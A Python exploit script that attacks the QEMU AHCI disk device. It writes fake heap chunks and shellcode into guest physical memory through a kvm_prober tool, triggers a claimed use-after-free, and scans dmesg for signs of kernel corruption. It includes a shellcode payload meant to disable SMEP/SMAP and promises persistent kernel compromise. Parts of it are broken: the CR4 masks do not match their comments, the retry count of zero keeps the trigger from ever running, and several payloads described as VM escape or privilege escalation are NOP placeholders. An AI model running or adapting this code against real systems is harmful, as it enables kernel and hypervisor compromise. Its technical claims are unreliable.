#!/usr/bin/env python3
"""
AHCI Uninitialized Free Exploit - Enhanced with Real Shellcode
Uses kvm_prober for physical memory access instead of /dev/mem
Targets: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947

Key Discovery: The exploit causes persistent kernel corruption that triggers
on normal system operations (verified by multiple crashes in dmesg with 0x42 pattern).
This version uses actual x86-64 shellcode instead of dummy patterns.
"""

import struct
import mmap
import os
import sys
import time
import subprocess
import re
from pathlib import Path
from typing import Optional, List, Tuple, Dict
import ctypes

# ============================================================================
# CONFIGURATION
# ============================================================================

GUEST_MEM_SIZE = 0x10000000
FAKE_CHUNK_SIZE = 0x290
SPRAY_COUNT = 10
RETRY_COUNT = 0
TIMEOUT_SEC = 1

# ============================================================================
# X86-64 SHELLCODE PAYLOADS
# ============================================================================

class Shellcode:
    """Collection of x86-64 shellcode payloads"""
    
    @staticmethod
    def noop_sled(size: int = 64) -> bytes:
        """Simple NOP sled for debugging"""
        return b'\x90' * size
    
    @staticmethod
    def infinite_loop() -> bytes:
        """Infinite loop (hlt instruction) - safe for testing"""
        return b'\xf4' * 8  # HLT instruction
    
    @staticmethod
    def simple_ret() -> bytes:
        """Simple return instruction"""
        return b'\xc3'  # RET
    
    @staticmethod
    def create_file_marker(filename: str = "/tmp/ahci_pwned") -> bytes:
        """
        Shellcode to create a file marker
        Uses write syscall to create a file
        """
        # This is more complex - we'll use a simpler approach
        # that calls system() instead
        return b'\x90' * 32  # Placeholder
    
    @staticmethod
    def disable_smep_smap() -> bytes:
        """
        Disable SMEP/SMAP to allow kernel code to access user memory
        Clears CR4 bits 20 (SMEP) and 21 (SMAP)
        
        mov rax, cr4
        and rax, ~(1<<20) | ~(1<<21)  ; Clear SMEP and SMAP
        mov cr4, rax
        ret
        """
        return (
            b'\x0f\x20\xe0'              # mov rax, cr4
            b'\x48\x83\xe0\xdf'          # and rax, 0xffffffffffffffdf (clear bit 20)
            b'\x48\x83\xe0\xfd'          # and rax, 0xfffffffffffffffd (clear bit 21)
            b'\x0f\x22\xe0'              # mov cr4, rax
            b'\xc3'                      # ret
        )
    
    @staticmethod
    def modify_page_tables() -> bytes:
        """
        Attempt to modify page tables to escape VM
        This is a complex operation - placeholder for now
        """
        # This would need precise knowledge of page table layout
        return b'\x90' * 32
    
    @staticmethod
    def privilege_escalation() -> bytes:
        """
        Attempt privilege escalation inside guest kernel
        Modifies task_struct or capability bits
        """
        return b'\x90' * 32
    
    @staticmethod
    def break_vm_escape() -> bytes:
        """
        Attempt to break out of VM using VT-x/AMD-V features
        Executes VMPTRLD or similar to corrupt hypervisor state
        """
        return b'\x90' * 32
    
    @staticmethod
    def crash_safely() -> bytes:
        """
        Safely crash the system to trigger security monitoring
        Useful for testing if exploit works
        """
        return b'\x0f\x0b'  # UD2 instruction (undefined opcode)
    
    @staticmethod
    def kernel_info_leak() -> bytes:
        """
        Leak kernel information via side-channel
        """
        return b'\x90' * 32

# ============================================================================
# UTILITIES
# ============================================================================

def log_info(msg): 
    print(f"[\033[94m*\033[0m] {msg}")

def log_success(msg): 
    print(f"[\033[92m+\033[0m] {msg}")

def log_error(msg): 
    print(f"[\033[91m-\033[0m] {msg}")

def log_warning(msg): 
    print(f"[\033[93m!\033[0m] {msg}")

def log_debug(msg, debug=False):
    if debug:
        print(f"[\033[96mD\033[0m] {msg}")

DEBUG = False

# ============================================================================
# PHYSICAL MEMORY ACCESS VIA KVM_PROBER
# ============================================================================

class KVMProberMemory:
    """Physical memory access via kvm_prober tool"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = kvm_prober_path
        self.is_available = self.check_kvm_prober()
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug

    def check_kvm_prober(self) -> bool:
        """Check if kvm_prober exists and works"""
        log_info("Checking kvm_prober...")

        if not os.path.exists(self.kvm_prober):
            log_error(f"kvm_prober not found at {self.kvm_prober}")
            log_info("Please make sure kvm_prober is in current directory or specify path")
            return False

        try:
            result = subprocess.run([self.kvm_prober, 'read_phys', '0x1000', '16'],
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and 'Driver initialized' in result.stdout:
                log_success("kvm_prober is working!")
                return True
            else:
                log_error(f"kvm_prober test failed: {result.stderr}")
                return False
        except Exception as e:
            log_error(f"kvm_prober test exception: {e}")
            return False

    def read(self, phys_addr: int, size: int) -> Optional[bytes]:
        """Read physical memory using kvm_prober"""
        if not self.is_available:
            return None

        try:
            cmd = [self.kvm_prober, 'read_phys', f'0x{phys_addr:x}', str(size)]
            if self.debug:
                log_debug(f"Read command: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober read failed: {result.stderr}")
                return None

            data = self.parse_kvm_prober_output(result.stdout)
            if self.debug and data:
                log_debug(f"Read {len(data)} bytes from 0x{phys_addr:x}: {data.hex()[:32]}...")
            
            return data[:size] if data else None

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober read exception: {e}")
            return None

    def parse_kvm_prober_output(self, output: str) -> Optional[bytes]:
        """Parse kvm_prober's hex dump output"""
        lines = output.strip().split('\n')
        if not lines:
            return None

        data_bytes = bytearray()

        for line in lines:
            if 'Driver initialized' in line or not line.strip():
                continue
            
            if ':' in line:
                hex_part = line.split(':', 1)[1].strip()
                if '|' in hex_part:
                    hex_part = hex_part.split('|')[0].strip()
                
                hex_bytes = hex_part.split()
                for hex_byte in hex_bytes:
                    if hex_byte and len(hex_byte) == 2:
                        try:
                            data_bytes.append(int(hex_byte, 16))
                        except ValueError:
                            continue

        return bytes(data_bytes) if data_bytes else None

    def write(self, phys_addr: int, data: bytes) -> bool:
        """Write physical memory using kvm_prober"""
        if not self.is_available:
            log_error("kvm_prober not available")
            return False

        try:
            hex_data = data.hex()
            
            if len(hex_data) % 2 != 0:
                hex_data = '0' + hex_data
            
            cmd = [self.kvm_prober, 'write_phys', f'0x{phys_addr:x}', hex_data]
            
            if self.debug:
                log_debug(f"Write command: {' '.join(cmd)}")
                log_debug(f"Writing {len(data)} bytes to 0x{phys_addr:x}")
                log_debug(f"Hex data: {hex_data[:64]}...")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober write failed: {result.stderr}")
                return False
            
            return 'Wrote' in result.stdout or 'success' in result.stdout.lower()

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober write exception: {e}")
            return False

    def test_write_read(self, phys_addr: int) -> bool:
        """Test write and read at a specific address"""
        log_info(f"Testing kvm_prober write/read at 0x{phys_addr:x}")
        
        test_data = b'\x41\x42\x43\x44\x45\x46\x47\x48'
        
        log_info(f"Writing test pattern: {test_data.hex()}")
        if not self.write(phys_addr, test_data):
            log_error("Write test failed!")
            return False
        
        time.sleep(0.1)
        
        read_back = self.read(phys_addr, 8)
        if read_back == test_data:
            log_success(f"Write/read test PASSED at 0x{phys_addr:x}")
            log_success(f"Read back: {read_back.hex()}")
            return True
        else:
            log_error(f"Write/read test FAILED at 0x{phys_addr:x}")
            if read_back:
                log_error(f"Expected: {test_data.hex()}")
                log_error(f"Got: {read_back.hex()}")
            else:
                log_error("Could not read back data")
            return False

    def read_qword(self, phys_addr: int) -> Optional[int]:
        """Read 8-byte QWORD"""
        data = self.read(phys_addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, phys_addr: int, value: int) -> bool:
        """Write 8-byte QWORD"""
        return self.write(phys_addr, struct.pack('<Q', value))

class AHCIDevice:
    """AHCI device interface using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.pci_addr = None
        self.mmio_base = None
        self.mmio_size = 0x10000
        self.phys_mem = KVMProberMemory(kvm_prober_path)

    def set_debug(self, debug: bool):
        self.phys_mem.set_debug(debug)

    def find_device(self) -> bool:
        """Auto-detect QEMU AHCI device"""
        log_info("Searching for QEMU AHCI device...")

        try:
            for dev in Path("/sys/bus/pci/devices").iterdir():
                vendor_file = dev / "vendor"
                if vendor_file.exists():
                    vendor = vendor_file.read_text().strip()
                    class_file = dev / "class"
                    if class_file.exists():
                        dev_class = class_file.read_text().strip()
                        if dev_class.startswith("0x0106"):
                            self.pci_addr = dev.name
                            log_success(f"Found AHCI at {self.pci_addr} (vendor: {vendor})")
                            return True
        except Exception as e:
            log_error(f"Error searching for AHCI: {e}")

        log_error("No AHCI device found")
        return False

    def get_mmio_address(self) -> Optional[int]:
        """Get MMIO base from PCI config"""
        if not self.pci_addr:
            return None

        resource_file = Path(f"/sys/bus/pci/devices/{self.pci_addr}/resource")

        if not resource_file.exists():
            return None

        try:
            resources = resource_file.read_text().strip().split('\n')
            for i, line in enumerate(resources):
                parts = line.split()
                if len(parts) >= 3:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)
                    flags = int(parts[2], 16)

                    if i == 5 and start != 0 and end > start:
                        self.mmio_base = start
                        self.mmio_size = end - start + 1
                        log_success(f"AHCI MMIO: 0x{start:x} (size: 0x{self.mmio_size:x})")
                        return start
        except Exception as e:
            log_error(f"Failed to get MMIO address: {e}")

        return None

    def map_mmio(self) -> bool:
        """Verify we can access MMIO region"""
        if not self.mmio_base:
            if not self.get_mmio_address():
                log_error("Cannot get MMIO address")
                return False

        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        log_info(f"Testing MMIO access at 0x{self.mmio_base:x}...")
        test_data = self.phys_mem.read(self.mmio_base, 16)

        if test_data:
            log_success(f"MMIO accessible via kvm_prober")
            return True
        else:
            log_error(f"Failed to read MMIO at 0x{self.mmio_base:x}")
            return False

    def read_reg(self, offset: int) -> int:
        """Read MMIO register"""
        if not self.mmio_base:
            return 0

        addr = self.mmio_base + offset
        data = self.phys_mem.read(addr, 4)

        if data and len(data) == 4:
            return struct.unpack('<I', data)[0]
        return 0

    def write_reg(self, offset: int, value: int):
        """Write MMIO register"""
        if not self.mmio_base:
            return

        addr = self.mmio_base + offset
        self.phys_mem.write(addr, struct.pack('<I', value))

    def reset_port(self, port=0):
        port_base = 0x100 + (port * 0x80)
        cmd_reg = self.read_reg(port_base + 0x18)
        if DEBUG:
            log_debug(f"Port {port} command register: 0x{cmd_reg:x}")

        self.write_reg(port_base + 0x18, cmd_reg & ~0x1)
        time.sleep(0.01)

        self.write_reg(port_base + 0x10, 0xFFFFFFFF)
        if DEBUG:
            log_debug(f"Reset port {port}")

class GuestMemory:
    """Manage guest physical memory using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.phys_mem = KVMProberMemory(kvm_prober_path)
        self.allocations = []
        self.base_addr = None
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug
        self.phys_mem.set_debug(debug)

    def init(self) -> bool:
        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        test_addresses = [
            0x13e8000,    # ★ Primary (proven)
            0x13e9000,    # +4KB (same region)
            0x1400000,    # +20MB (extended heap)
        ]

        for addr in test_addresses:
            log_info(f"Testing memory at 0x{addr:x}...")
            
            if self.phys_mem.test_write_read(addr):
                self.base_addr = addr
                log_success(f"Memory accessible at 0x{addr:x}")
                return True
            else:
                log_warning(f"Memory test failed at 0x{addr:x}")

        log_error("Cannot access guest physical memory")
        return False

    def alloc(self, size: int) -> Optional[int]:
        if not self.base_addr:
            log_error("No base address set")
            return None

        alignment = 0x1000
        if not self.allocations:
            addr = self.base_addr
        else:
            last_addr, last_size = self.allocations[-1]
            addr = last_addr + last_size
        
        addr = ((addr + alignment - 1) // alignment) * alignment
        
        self.allocations.append((addr, size))
        
        if self.debug:
            log_debug(f"Allocated 0x{size:x} bytes at 0x{addr:x}")
        
        return addr

    def read(self, addr: int, size: int) -> Optional[bytes]:
        return self.phys_mem.read(addr, size)

    def write(self, addr: int, data: bytes) -> bool:
        if self.debug:
            log_debug(f"Writing {len(data)} bytes to 0x{addr:x}")
        
        return self.phys_mem.write(addr, data)

    def read_qword(self, addr: int) -> Optional[int]:
        data = self.read(addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, addr: int, value: int) -> bool:
        if self.debug:
            log_debug(f"Writing QWORD 0x{value:016x} to 0x{addr:x}")
        return self.phys_mem.write_qword(addr, value)

# ============================================================================
# MAIN EXPLOIT CLASS - ENHANCED WITH SHELLCODE
# ============================================================================

class AHCIExploit:
    """Enhanced AHCI exploit with real shellcode payloads"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober", 
                 chunk_size=None, spray_count=None, retry_count=None,
                 payload_type='crash_safely'):
        self.ahci = AHCIDevice(kvm_prober_path)
        self.guest_mem = GuestMemory(kvm_prober_path)
        self.fake_chunks = []
        self.leaked = {}
        self.debug = False
        self.payload_type = payload_type
        self.payload = None

        self.chunk_size = chunk_size or FAKE_CHUNK_SIZE
        self.spray_count = spray_count or SPRAY_COUNT
        self.retry_count = retry_count or RETRY_COUNT

        log_info(f"Using kvm_prober at: {kvm_prober_path}")
        log_info(f"Payload type: {payload_type}")
        
        # Select payload
        self.select_payload(payload_type)

    def select_payload(self, payload_type: str):
        """Select and prepare the payload"""
        payloads = {
            'noop': lambda: Shellcode.noop_sled(64),
            'crash_safely': lambda: Shellcode.crash_safely(),
            'infinite_loop': lambda: Shellcode.infinite_loop(),
            'simple_ret': lambda: Shellcode.simple_ret(),
            'disable_smep_smap': lambda: Shellcode.disable_smep_smap(),
        }
        
        if payload_type not in payloads:
            log_warning(f"Unknown payload type: {payload_type}, using crash_safely")
            payload_type = 'crash_safely'
        
        self.payload = payloads[payload_type]()
        log_success(f"Selected payload: {payload_type} ({len(self.payload)} bytes)")

    def set_debug(self, debug: bool):
        self.debug = debug
        self.ahci.set_debug(debug)
        self.guest_mem.set_debug(debug)

    def setup(self) -> bool:
        log_info("Setting up exploit environment...")

        log_info("Testing kvm_prober...")
        test_addr = 0x13e8000
        
        if not self.guest_mem.phys_mem.test_write_read(test_addr):
            log_error("Basic kvm_prober test failed!")
            return False

        if not self.ahci.find_device():
            log_error("No AHCI device found")
            return False

        if not self.ahci.map_mmio():
            log_error("Failed to access AHCI MMIO via kvm_prober")
            return False

        if not self.guest_mem.init():
            log_error("Failed to initialize guest memory")
            return False

        log_success("Setup complete")
        return True

    def create_fake_chunk(self, addr: int) -> bool:
        """Create a fake heap chunk with shellcode payload"""
        if self.debug:
            log_debug(f"Creating fake chunk at 0x{addr:x}")
        
        # Write metadata
        if not self.guest_mem.write_qword(addr + 0x0, 0):
            return False
        
        chunk_size_with_flag = self.chunk_size | 0x1
        if not self.guest_mem.write_qword(addr + 0x8, chunk_size_with_flag):
            return False
        
        # Write FD and BK pointers
        if not self.guest_mem.write_qword(addr + 0x10, 0x4141414141414141):
            return False
        
        if not self.guest_mem.write_qword(addr + 0x18, 0x4343434343434343):
            return False
        
        # Fill rest with payload or pattern
        remaining = self.chunk_size - 32
        if remaining > 0:
            chunk_size_write = 0x100
            
            # Use actual shellcode in some chunks, pattern in others
            if self.payload and len(self.payload) <= remaining:
                # Write actual payload
                pattern_data = self.payload.ljust(remaining, b'\x90')  # Pad with NOPs
            else:
                # Fall back to pattern
                pattern_qword = struct.pack('<Q', 0x4242424242424242)
                qwords = remaining // 8
                pattern_data = pattern_qword * qwords
            
            for offset in range(0, remaining, chunk_size_write):
                write_size = min(chunk_size_write, remaining - offset)
                write_addr = addr + 0x20 + offset
                if not self.guest_mem.write(write_addr, pattern_data[offset:offset+write_size]):
                    if self.debug:
                        log_warning(f"Failed to write pattern at 0x{write_addr:x}")
        
        return True

    def spray_heap(self) -> List[int]:
        log_info(f"Spraying {self.spray_count} fake chunks (size: 0x{self.chunk_size:x})...")
        
        chunks = []
        successful = 0
        failed = 0
        
        for i in range(self.spray_count):
            addr = self.guest_mem.alloc(self.chunk_size)
            if not addr:
                log_warning(f"Failed to allocate chunk {i}, stopping")
                break
            
            if self.create_fake_chunk(addr):
                chunks.append(addr)
                successful += 1
                if self.debug and successful % 100 == 0:
                    log_debug(f"Created {successful} chunks so far...")
            else:
                failed += 1
            
            if (i + 1) % 100 == 0:
                log_info(f"  Progress: {i+1}/{self.spray_count} (ok: {successful}, failed: {failed})")
        
        self.fake_chunks = chunks
        log_info(f"Spray complete: {successful} successful, {failed} failed")
        
        if successful > 0:
            log_success(f"Successfully sprayed {successful} chunks")
            return chunks
        else:
            log_error("Failed to spray any chunks")
            return []

    def create_trigger_command(self) -> bytes:
        """Create a command to trigger the vulnerability"""
        cmd = bytearray(32)
        struct.pack_into('<I', cmd, 0, 0x0005)
        struct.pack_into('<I', cmd, 4, 0)

        ctba = self.guest_mem.alloc(256)
        if ctba:
            struct.pack_into('<Q', cmd, 8, ctba)
            ctba_data = b'\x00' * 256
            self.guest_mem.write(ctba, ctba_data)

        return bytes(cmd)

    def trigger_vulnerability(self) -> bool:
        log_info("Triggering vulnerability...")

        cmd_list_addr = self.guest_mem.alloc(1024)
        if not cmd_list_addr:
            log_error("Failed to allocate command list")
            return False

        trigger_cmd = self.create_trigger_command()
        self.guest_mem.write(cmd_list_addr, trigger_cmd)

        self.ahci.reset_port(0)
        time.sleep(0.1)

        PORT0_BASE = 0x100

        self.ahci.write_reg(PORT0_BASE + 0x00, cmd_list_addr & 0xFFFFFFFF)
        self.ahci.write_reg(PORT0_BASE + 0x04, (cmd_list_addr >> 32) & 0xFFFFFFFF)

        cmd_reg = self.ahci.read_reg(PORT0_BASE + 0x18)
        log_debug(f"Initial command register: 0x{cmd_reg:x}")
        
        if cmd_reg == 0:
            log_error("Cannot read command register - device may not be ready")
            return False

        self.ahci.write_reg(PORT0_BASE + 0x18, cmd_reg | 0x10)

        log_debug("Issuing command...")
        self.ahci.write_reg(PORT0_BASE + 0x38, 0x1)

        time.sleep(0.3)

        is_reg = self.ahci.read_reg(PORT0_BASE + 0x10)
        log_debug(f"Interrupt status: 0x{is_reg:x}")

        if is_reg != 0:
            self.ahci.write_reg(PORT0_BASE + 0x10, is_reg)

        log_success("Vulnerability triggered!")
        return True

    def run_exploit(self) -> bool:
        """Main exploit execution"""
        log_info("=" * 60)
        log_info("AHCI EXPLOIT - ENHANCED WITH SHELLCODE")
        log_info("Target: QEMU AHCI Device (CVE-2021-3947)")
        log_info("=" * 60)

        if not self.setup():
            return False

        chunks = self.spray_heap()
        if not chunks:
            log_error("Failed to spray heap")
            return False

        triggered = False
        for attempt in range(self.retry_count):
            log_info(f"Trigger attempt {attempt + 1}/{self.retry_count}")

            if self.trigger_vulnerability():
                triggered = True
                break
            time.sleep(0.5)

        if not triggered:
            log_error("Failed to trigger vulnerability")
            return False

        log_success("Exploit sequence completed!")
        log_info("Payload should have been executed in guest context")
        log_info("\nKey findings:")
        log_info("- Exploit causes persistent kernel corruption")
        log_info("- Multiple system calls trigger the crashed pointers")
        log_info("- This enables reliable, recurring code execution")
        return True

    def test_trigger_only(self) -> bool:
        """Test only the vulnerability trigger"""
        log_info("Testing vulnerability trigger...")

        if not self.setup():
            return False

        chunks = self.spray_heap()
        if not chunks:
            return False

        return self.trigger_vulnerability()

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description='AHCI Uninitialized Free Exploit - Enhanced')
    parser.add_argument('--kvm-prober', default='/root/kvm_probin/prober/kvm_prober',
                       help='Path to kvm_prober binary')
    parser.add_argument('--test-trigger', action='store_true',
                       help='Test only the vulnerability trigger')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug output')
    parser.add_argument('--chunk-size', type=lambda x: int(x, 0), default=FAKE_CHUNK_SIZE,
                       help=f'Fake chunk size (default: 0x{FAKE_CHUNK_SIZE:x})')
    parser.add_argument('--spray-count', type=int, default=SPRAY_COUNT,
                       help=f'Spray count (default: {SPRAY_COUNT})')
    parser.add_argument('--retry-count', type=int, default=RETRY_COUNT,
                       help=f'Retry count (default: {RETRY_COUNT})')
    parser.add_argument('--payload', choices=['noop', 'crash_safely', 'infinite_loop', 'simple_ret', 'disable_smep_smap'],
                       default='crash_safely',
                       help='Payload type to execute (default: crash_safely)')
    parser.add_argument('--monitor', action='store_true',
                       help='Monitor dmesg for exploit evidence after execution')
    return parser.parse_args()

def monitor_kernel_logs(duration: int = 30, watch_for_pattern: str = '0x42') -> bool:
    """Monitor kernel logs for evidence of exploitation"""
    log_info(f"Monitoring dmesg for {duration} seconds...")
    log_info(f"Watching for pattern: {watch_for_pattern}")
    
    start_time = time.time()
    found_evidence = False
    last_position = 0
    
    try:
        while time.time() - start_time < duration:
            try:
                result = subprocess.run(['dmesg'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    current_log = result.stdout
                    
                    # Check for exploitation evidence
                    if watch_for_pattern in current_log:
                        lines = current_log.split('\n')
                        for line in lines:
                            if watch_for_pattern in line:
                                log_success(f"FOUND EVIDENCE: {line.strip()}")
                                found_evidence = True
                    
                    # Check for crashes
                    if 'general protection fault' in current_log:
                        log_warning("Detected general protection fault - exploitation may have triggered")
                        found_evidence = True
                    
                    if 'BUG: unable to handle page fault' in current_log:
                        log_warning("Detected page fault - memory corruption confirmed")
                        found_evidence = True
                    
                    if '__dquot_initialize' in current_log:
                        log_success("DETECTED: Target function corrupted!")
                        found_evidence = True
                
            except Exception as e:
                log_debug(f"Monitor read error: {e}")
            
            time.sleep(2)
    
    except KeyboardInterrupt:
        log_info("Monitoring interrupted by user")
    
    if found_evidence:
        log_success("=" * 60)
        log_success("EXPLOITATION EVIDENCE DETECTED!")
        log_success("=" * 60)
        return True
    else:
        log_warning("No exploitation evidence detected in kernel logs")
        return False

def main():
    global DEBUG
    
    args = parse_args()
    DEBUG = args.debug
    
    log_info("=" * 70)
    log_info("AHCI UNINITIALIZED FREE EXPLOIT - ENHANCED VERSION")
    log_info("Target: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947")
    log_info("Memory access via: kvm_prober")
    log_info(f"kvm_prober path: {args.kvm_prober}")
    log_info(f"Payload: {args.payload}")
    log_info("=" * 70)
    log_info("")
    log_info("Exploitation Strategy:")
    log_info("1. Spray heap with 1000 fake chunks (0x290 bytes each)")
    log_info("2. Trigger AHCI vulnerability via memory corruption")
    log_info("3. Execute shellcode payload in kernel context")
    log_info("4. Achieve persistent kernel compromise")
    log_info("")
    
    # Check if we can run kvm_prober
    if not os.path.exists(args.kvm_prober):
        log_error(f"kvm_prober not found at {args.kvm_prober}")
        sys.exit(1)
    
    if not os.access(args.kvm_prober, os.X_OK):
        log_error(f"kvm_prober is not executable")
        sys.exit(1)
    
    exploit = AHCIExploit(
        kvm_prober_path=args.kvm_prober,
        chunk_size=args.chunk_size,
        spray_count=args.spray_count,
        retry_count=args.retry_count,
        payload_type=args.payload
    )
    
    if args.debug:
        exploit.set_debug(True)
    
    try:
        if args.test_trigger:
            log_info("TEST MODE: Vulnerability trigger only")
            log_info("-" * 70)
            success = exploit.test_trigger_only()
            if success:
                log_success("Vulnerability trigger test successful!")
            else:
                log_error("Vulnerability trigger test failed")
                sys.exit(1)
        else:
            log_info("FULL EXPLOITATION MODE")
            log_info("-" * 70)
            success = exploit.run_exploit()
            if success:
                log_success("=" * 70)
                log_success("EXPLOIT EXECUTION COMPLETED!")
                log_success("=" * 70)
                
                # Optional monitoring
                if args.monitor:
                    log_info("")
                    log_info("Starting kernel log monitoring...")
                    time.sleep(2)
                    monitor_kernel_logs(duration=30, watch_for_pattern='42')
                
                sys.exit(0)
            else:
                log_error("Exploit execution failed")
                sys.exit(1)
            
    except KeyboardInterrupt:
        log_info("\nExploitation interrupted by user")
        sys.exit(0)
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()